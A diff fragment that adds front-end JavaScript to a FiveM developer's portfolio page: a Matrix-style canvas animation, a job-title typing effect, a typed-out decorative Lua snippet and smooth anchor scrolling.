+                // Only calculate columns based on current width (in case of resize without full reset)
+                columns = Math.ceil(canvas.width / fontSize);
+
+                for (let i = 0; i < columns; i++) {
+                    // Initialize drop if not exists
+                    if (drops[i] === undefined) drops[i] = 1;
+
+                    // Optimization: Only draw if the drop is somewhat on screen (or just above)
+                    // But we need to draw everything for the trail effect to work properly.
+                    // The main optimization is the FPS cap.
+                    
+                    const text = charArray[Math.floor(Math.random() * charArray.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+        }
+        
+        // Start Animation
+        requestAnimationFrame(drawMatrix);
+
+
+        // Typing Effect
+        const textElement = document.getElementById('typing-text');
+        const texts = ['FiveM Developer', 'Lua Scripter', 'NUI Designer', 'Server Optimizer'];
+        let textIndex = 0;
+        let charIndex = 0;
+        let isDeleting = false;
+        let typeSpeed = 100;
+
+        function type() {
+            const currentText = texts[textIndex];
+            
+            if (isDeleting) {
+                textElement.textContent = currentText.substring(0, charIndex - 1);
+                charIndex--;
+                typeSpeed = 50;
+            } else {
+                textElement.textContent = currentText.substring(0, charIndex + 1);
+                charIndex++;
+                typeSpeed = 100;
+            }
+
+            if (!isDeleting && charIndex === currentText.length) {
+                isDeleting = true;
+                typeSpeed = 2000;
+            } else if (isDeleting && charIndex === 0) {
+                isDeleting = false;
+                textIndex = (textIndex + 1) % texts.length;
+                typeSpeed = 500;
+            }
+
+            setTimeout(type, typeSpeed);
+        }
+
+        // Code Typing Animation (Lua Style)
+        const codeSource = [
+            { text: "RegisterNetEvent", color: "text-purple-400" },
+            { text: "(", color: "text-white" },
+            { text: "'arwx:init'", color: "text-green-300" },
+            { text: ")", color: "text-white" },
+            { text: "\n", color: "text-white" },
+            { text: "AddEventHandler", color: "text-blue-400" },
+            { text: "(", color: "text-white" },
+            { text: "'arwx:init'", color: "text-green-300" },
+            { text: ", ", color: "text-white" },
+            { text: "function", color: "text-purple-400" },
+            { text: "()", color: "text-white" },
+            { text: "\n    ", color: "text-white" },
+            { text: "local ", color: "text-purple-400" },
+            { text: "dev", color: "text-orange-300" },
+            { text: " = ", color: "text-white" },
+            { text: "{", color: "text-white" },
+            { text: "\n        ", color: "text-white" },
+            { text: "name", color: "text-blue-300" },
+            { text: " = ", color: "text-white" },
+            { text: "'Arwx!core'", color: "text-green-300" },
+            { text: ",", color: "text-white" },
+            { text: "\n        ", color: "text-white" },
+            { text: "skill", color: "text-blue-300" },
+            { text: " = ", color: "text-white" },
+            { text: "'FiveM Expert'", color: "text-green-300" },
+            { text: ",", color: "text-white" },
+            { text: "\n        ", color: "text-white" },
+            { text: "frameworks", color: "text-blue-300" },
+            { text: " = ", color: "text-white" },
+            { text: "{", color: "text-white" },
+            { text: "'ESX'", color: "text-green-300" },
+            { text: ", ", color: "text-white" },
+            { text: "'QBCore'", color: "text-green-300" },
+            { text: "}", color: "text-white" },
+            { text: "\n    ", color: "text-white" },
+            { text: "}", color: "text-white" },
+            { text: "\n    ", color: "text-white" },
+            { text: "print", color: "text-blue-400" },
+            { text: "(", color: "text-white" },
+            { text: "'System Ready...'", color: "text-green-300" },
+            { text: ")", color: "text-white" },
+            { text: "\n", color: "text-white" },
+            { text: "end", color: "text-purple-400" },
+            { text: ")", color: "text-white" }
+        ];
+
+        async function typeCode() {
+            const container = document.getElementById('typewriter-code');
+            if (!container) return;
+            
+            while(true) {
+                container.innerHTML = '';
+                
+                for (const segment of codeSource) {
+                    const span = document.createElement('span');
+                    span.className = segment.color;
+                    container.appendChild(span);
+                    
+                    for (const char of segment.text) {
+                        span.textContent += char;
+                        await new Promise(r => setTimeout(r, 10 + Math.random() * 30));
+                    }
+                }
+                
+                // Add blinking cursor at the end
+                const cursor = document.createElement('span');
+                cursor.className = 'cursor';
+                cursor.innerHTML = '&nbsp;';
+                container.appendChild(cursor);
+
+                await new Promise(r => setTimeout(r, 5000));
+                container.innerHTML = ''; // Clear for next loop
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            type(); // Start header typing
+            typeCode(); // Start code typing
+        });
+
+        // Smooth Scrolling
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+    </script>
 </body>
 </html>
